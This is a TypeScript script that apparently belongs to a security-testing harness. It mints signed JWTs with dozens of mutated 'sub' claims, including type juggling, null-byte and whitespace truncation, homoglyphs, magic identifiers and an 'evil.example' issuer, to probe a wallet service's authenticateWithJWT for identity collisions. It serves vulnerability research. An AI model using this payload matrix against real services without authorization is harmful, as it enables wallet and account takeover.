#!/usr/bin/env tsx
/**
 * mint.ts — mint a batch of end-user JWTs for the C41 claim-collision test.
 *
 * Reads the private key (keys/signing-key.json) + config.local.json, signs one JWT per mutation
 * row below, writes out/matrix.json = [{ label, jwt }] for the browser harness (src/main.ts) to
 * run through the target's `authenticateWithJWT`.
 *
 * ORACLE: if two DISTINCT rows resolve to the SAME wallet address downstream => C41 wallet-takeover.
 * The private key stays in Node — only signed JWTs travel to the browser. out/ is GITIGNORED.
 *
 * Run:  npx tsx scripts/mint.ts
 */
import { SignJWT, importJWK } from 'jose';
import { randomUUID } from 'node:crypto';
import { readFileSync, writeFileSync, mkdirSync, existsSync } from 'node:fs';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const p = (...s: string[]) => resolve(ROOT, ...s);

type Row = { label: string; sub?: unknown; omitSub?: boolean; iss?: string; aud?: string };

// two stable-per-run, clearly-distinct control subjects
const A = `alice-${randomUUID()}`;
const B = `bob-${randomUUID()}`;

const MATRIX: Row[] = [
  // --- CONTROL: must yield DISTINCT wallets (proves provisioning is per-sub, so a collision means something) ---
  { label: 'control-distinct-A', sub: A },
  { label: 'control-distinct-B', sub: B },
  { label: 'control-repeat-A', sub: A }, // identical sub twice -> MUST be the SAME wallet (sanity)

  // --- type juggling (Node/Go zero-value coercion of a non-string sub) ---
  { label: 'type-bool-true', sub: true },
  { label: 'type-number-123', sub: 123 },
  { label: 'type-array-123', sub: [123] },
  { label: 'type-object-empty', sub: {} },
  { label: 'type-null', sub: null },

  // --- zero / empty / missing ---
  { label: 'empty-string', sub: '' },
  { label: 'string-null', sub: 'null' },
  { label: 'single-space', sub: ' ' },
  { label: 'sub-absent', omitSub: true },

  // --- truncation (silent DB length caps) ---
  { label: 'trunc-500A', sub: 'A'.repeat(500) },
  { label: 'trunc-499A+B', sub: 'A'.repeat(499) + 'B' }, // differs from 500A ONLY at index 499
  { label: 'trunc-65x', sub: 'x'.repeat(65) },
  { label: 'trunc-129y', sub: 'y'.repeat(129) },
  { label: 'trunc-257z', sub: 'z'.repeat(257) },

  // --- unicode / homograph (dangerous normalization / lossy encoding) ---
  { label: 'homoglyph-latin-admin', sub: 'admin' },
  { label: 'homoglyph-cyrillic-admin', sub: 'аdmin' }, // U+0430 CYRILLIC а + "dmin"
  { label: 'nfkc-ligature-file', sub: 'ﬁle' }, // "ﬁle" -> NFKC "file"
  { label: 'nfkc-plain-file', sub: 'file' },
  { label: 'fullwidth-USER', sub: 'ＵＳＥＲ' }, // "ＵＳＥＲ" -> NFKC "USER"

  // --- case sensitivity (citext / case-insensitive collations) ---
  { label: 'case-upper', sub: 'user_ID' },
  { label: 'case-lower', sub: 'user_id' },

  // --- whitespace / control / null-byte truncation ---
  { label: 'ws-base', sub: 'user_1' },
  { label: 'ws-trailing-space', sub: 'user_1 ' },
  { label: 'ws-tab', sub: 'user_1\t' },
  { label: 'ws-newline', sub: 'user_1\n' },
  { label: 'ws-nullbyte', sub: 'user_1\x00' },
  { label: 'ws-nullbyte-evil', sub: 'user_1\x00evil' },

  // --- magic / bypass values (WK3 honeypot-reverse: hardcoded internal identifiers) ---
  { label: 'magic-internal-test', sub: 'internal-coinbase-testing' },
  { label: 'magic-zero-uuid', sub: '00000000-0000-0000-0000-000000000000' },
  { label: 'magic-admin', sub: 'admin' }, // == homoglyph-latin-admin (dupe = sanity: same value -> same wallet)
  { label: 'magic-system', sub: 'system' },
  { label: 'magic-zero', sub: '0' },
  { label: 'magic-neg1', sub: '-1' },

  // --- cross-issuer: same sub, different iss/aud (does the wallet key on sub ALONE, ignoring iss/aud?) ---
  { label: 'xiss-same-sub-altiss', sub: A, iss: 'https://evil.example/idp' },
  { label: 'xaud-same-sub-altaud', sub: A, aud: 'some-other-audience' },
];

async function main() {
  const keyFile = p('keys', 'signing-key.json');
  if (!existsSync(keyFile)) throw new Error('keys/signing-key.json missing — run: npx tsx scripts/genkeys.ts');
  const { kid, privateJwk } = JSON.parse(readFileSync(keyFile, 'utf8'));

  const cfgFile = p('config.local.json');
  if (!existsSync(cfgFile)) throw new Error('config.local.json missing — copy config.example.json and fill it in');
  const cfg = JSON.parse(readFileSync(cfgFile, 'utf8'));
  if (String(cfg.iss).includes('<'))
    console.warn('⚠️  config.local.json `iss` still has a placeholder — it MUST equal the portal `iss`');

  const privateKey = await importJWK(privateJwk, 'ES256');
  const now = Math.floor(Date.now() / 1000);
  const ttl = Number(cfg.ttlSeconds ?? 300);

  const out: { label: string; jwt: string }[] = [];
  for (const row of MATRIX) {
    const payload: Record<string, unknown> = {
      iss: row.iss ?? cfg.iss,
      aud: row.aud ?? cfg.aud,
      iat: now,
      exp: now + ttl,
      jti: randomUUID(),
    };
    if (!row.omitSub) payload.sub = row.sub; // NB: any type, on purpose (type-juggling rows)

    const jwt = await new SignJWT(payload as never)
      .setProtectedHeader({ alg: 'ES256', kid })
      .sign(privateKey);
    out.push({ label: row.label, jwt });
  }

  mkdirSync(p('out'), { recursive: true });
  writeFileSync(p('out', 'matrix.json'), JSON.stringify(out, null, 2));
  console.log(`✅ minted ${out.length} JWTs -> out/matrix.json   [🔒 GITIGNORED]`);
  console.log('   next: src/main.ts runs each through the target `authenticateWithJWT` and flags address collisions');
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
